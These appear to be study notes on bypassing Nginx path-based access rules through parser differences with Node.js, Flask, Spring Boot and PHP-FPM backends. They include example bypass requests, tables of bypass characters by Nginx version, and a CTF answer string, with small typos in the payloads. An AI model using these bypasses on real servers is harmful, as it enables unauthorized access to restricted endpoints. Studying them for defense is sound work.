# HTTP Parsers (NGINX)

## **Nginx ACL Rules Overview**

- Nginx allows applying security rules to HTTP requests.
- Rules can match based on strings or regex patterns in the HTTP pathname.

---

## **`location` Rule**

- Defines directives/behaviors for specific URLs.
- Example:
    
    ```jsx
    location = /admin {
        deny all;
    }
    
    location = /admin/ {
        deny all;
    }
    ```
    
- Purpose: Block access to `/admin` and `/admin/` by returning HTTP 403.

---

## **Path Normalization in Nginx**

- Ensures consistent URL handling before rule checks.
- Normalization steps include:
    - Removing redundant slashes.
    - Eliminating `.` or `..` segments (path traversal).
    - Decoding URL-encoded characters.
- Goal: Prevent bypasses and enforce uniform rule application.

---

## **Trim Behavior Across Languages**

### **Key Idea**

- The `trim()` (or equivalent) function removes whitespace/control characters from string edges.
- Different languages implement this **inconsistently**, leading to discrepancies in path normalization.
- Since Nginx (written in C) only covers a subset of characters, this mismatch can create security gaps.

### Examples:

**JavaScript (Node.js)**

```jsx
string = "\xa0 1337 \x85";
string.trim();
// Result: '1337 \x85'
// Note: \x85 is NOT removed.
```

**Python**

```jsx
string = "\xa0 1337 \x85"
string.strip()
# Result: '1337'
# Note: \x85 IS removed.
```

### **Security Implication**

- Nginx normalization may fail to strip certain characters (e.g., `\x85`) that other languages do.
- Attackers can exploit this inconsistency to bypass **URI-based ACL rules**.

Following the `trim()` logic, Node.js "ignores" the characters `\x09`, `\xa0`, and `\x0c` from the pathname, but Nginx considers them as part of the URL:

```jsx
// request
GET /admin\xa0 HTTP/1.1

//NGINX rule
location = /admin {
    deny all;
}

//Response
HTTP/1.1 200 OK
ADMIN
```

- First, Nginx receives the HTTP request and performs path normalization on the pathname;
- As Nginx includes the character `\xa0` as part of the pathname, the ACL rule for the `/admin` URI will not be triggered. Consequently, Nginx will forward the HTTP message to the backend;
- When the URI `/admin\x0a` is received by the Node.js server, the character `\xa0` will be removed, allowing successful retrieval of the `/admin` endpoint.

### CTF ANSWER QUERY: `/deliver?token=2f31333337a0:9d`

Below is a table correlating Nginx versions with characters that can 
potentially lead to bypassing URI ACL rules when using Node.js as the 
backend:

| Nginx Version | **Node.js Bypass Characters** |
| --- | --- |
| 1.22.0 | `\xA0` |
| 1.21.6 | `\xA0` |
| 1.20.2 | `\xA0`, `\x09`, `\x0C` |
| 1.18.0 | `\xA0`, `\x09`, `\x0C` |
| 1.16.1 | `\xA0`, `\x09`, `\x0C`  |

**Bypassing Nginx ACL Rules With Flask**

| Nginx Version | **Flask Bypass Characters** |
| --- | --- |
| 1.22.0 | `\x85`, `\xA0` |
| 1.21.6 | `\x85`, `\xA0` |
| 1.20.2 | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0 | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1 | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

**Bypassing Nginx ACL Rules With Spring Boot**

| Nginx Version | **Spring Boot Bypass Characters** |
| --- | --- |
| 1.22.0 | `;` |
| 1.21.6 | `;` |
| 1.20.2 | `\x09`, `;` |
| 1.18.0 | `\x09`, `;` |
| 1.16.1 | `\x09`, `;` |

**Bypassing Nginx ACL Rules With PHP-FPM Integration**

```jsx
//ngnix fpm config
location = /admin.php {
    deny all;
}

location ~ \.php$ {
    include snippets/fastcgi-php.conf;
    fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```

If two `.php` files share a request path, PHP serves the first, ignoring anything after the slash. So even if Nginx blocks `/admin.php`, you can still reach it using a modified path.

```jsx
//request

GET /admin.php/index.phpHTTP/1.1
Host: example.com
User-Agent: curl/7.85.0
Accept: */*
```

### For more info : [https://blog.bugport.net/exploiting-http-parsers-inconsistencies](https://blog.bugport.net/exploiting-http-parsers-inconsistencies)
